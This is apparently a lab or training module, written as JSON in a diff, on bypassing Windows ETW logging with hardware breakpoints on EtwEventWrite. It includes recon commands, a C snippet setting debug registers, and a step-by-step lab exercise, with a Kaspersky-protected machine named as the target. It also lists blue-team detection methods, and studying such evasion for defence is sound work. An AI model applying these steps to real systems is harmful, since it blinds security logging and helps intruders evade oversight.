@@ -1,0 +1,61 @@
+{
+  "theory": {
+    "commands": [
+      {
+        "command": "Get-Process | Where-Object { $_.Name -like '*Defender*' -or $_.Name -like '*Security*' } | Select-Object Name, Id",
+        "output": "Name                    Id\n----                    --\nSecurityHealthService 8996\nWinDefend                  Stopped",
+        "note": "WinDefend is STOPPED — Defender dormant. Kaspersky is the active defense."
+      }
+    ]
+  },
+  "recon": {
+    "commands": [
+      {
+        "command": "whoami /priv",
+        "output": "PRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                            Description                                                        State\n========================================= ================================================================== =======\nSeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled\nSeSecurityPrivilege                       Manage auditing and security log                                   Enabled\nSeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled\nSeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled\nSeSystemProfilePrivilege                  Profile system performance                                         Enabled\nSeSystemtimePrivilege                     Change the system time                                             Enabled\nSeProfileSingleProcessPrivilege           Profile single process                                             Enabled\nSeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled\nSeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled\nSeBackupPrivilege                         Back up files and directories                                      Enabled\nSeRestorePrivilege                        Restore files and directories                                      Enabled\nSeShutdownPrivilege                       Shut down the system                                               Enabled\nSeDebugPrivilege                          Debug programs                                                     Enabled\nSeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled\nSeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled\nSeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled\nSeUndockPrivilege                         Remove computer from docking station                               Enabled\nSeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled\nSeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled\nSeCreateGlobalPrivilege                   Create global objects                                              Enabled\nSeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled\nSeTimeZonePrivilege                       Change the time zone                                               Enabled\nSeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled\nSeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled",
+        "note": "Standard user with DEBUG privilege — can attach to processes, read memory, set breakpoints."
+      }
+    ]
+  },
+  "exploit": {
+    "commands": [
+      {
+        "command": "# Dark Room — HWBP on EtwEventWrite\n# DR0 = EtwEventWrite address\n# DR7 = 0x101 (local + global enable, exact match)",
+        "output": "// C code snippet:\nCONTEXT ctx = {0};\nctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\nctx.Dr0 = (DWORD64)EtwEventWrite;\nctx.Dr7 = 0x101;\nNtSetContextThread(hThread, &ctx);",
+        "note": "Zero memory writes. No patching. The breakpoint is hardware — invisible to software scanners."
+      }
+    ]
+  },
+  "demo": {
+    "commands": [
+      {
+        "command": "hostname",
+        "output": "LAPTOP-R32M8MLI",
+        "note": "Target: .92 Intel machine, Windows 11 Home Build 26200"
+      },
+      {
+        "command": "Get-Process | Where-Object { $_.Name -like '*avp*' } | Select-Object Name, Id",
+        "output": "Name    Id\n----    --\navp   5612\navp  11692",
+        "note": "Kaspersky active — two avp.exe processes. Real-world target."
+      }
+    ]
+  },
+  "detection": {
+    "commands": [
+      {
+        "command": "# Blue team detection vectors:\n# 1. Hypervisor-based tracing (Intel PT, AMD IBS)\n# 2. Kernel callbacks on debug register access\n# 3. ETW session analysis — look for gaps in event flow\n# 4. Memory forensics — check CONTEXT structures for Dr7 != 0",
+        "output": "Detection difficulty: HIGH\n\nHardware breakpoints leave no memory artifacts.\nNo API hooks. No patched bytes.\nThe only evidence is in the thread context —\nand that's volatile (gone on thread exit).",
+        "note": "This is why Dark Room is dangerous. It subverts the logging mechanism itself."
+      }
+    ]
+  },
+  "lab": {
+    "commands": [
+      {
+        "command": "LAB EXERCISE: Implement ETW Bypass",
+        "output": "1. Find EtwEventWrite in ntdll.dll\n2. Allocate a thread in your target process\n3. Set CONTEXT_DEBUG_REGISTERS with Dr0 = EtwEventWrite\n4. Set Dr7 = 0x101 (local + global enable)\n5. Call NtSetContextThread\n6. Trigger an ETW event (e.g., PowerShell execution)\n7. Verify: Event should NOT appear in Windows Event Log\n8. BONUS: Detect your own bypass using memory forensics",
+        "note": "Test on .92 (Kaspersky active) or .42 (clean sandbox). Document what works and what doesn't."
+      }
+    ]
+  }
+}
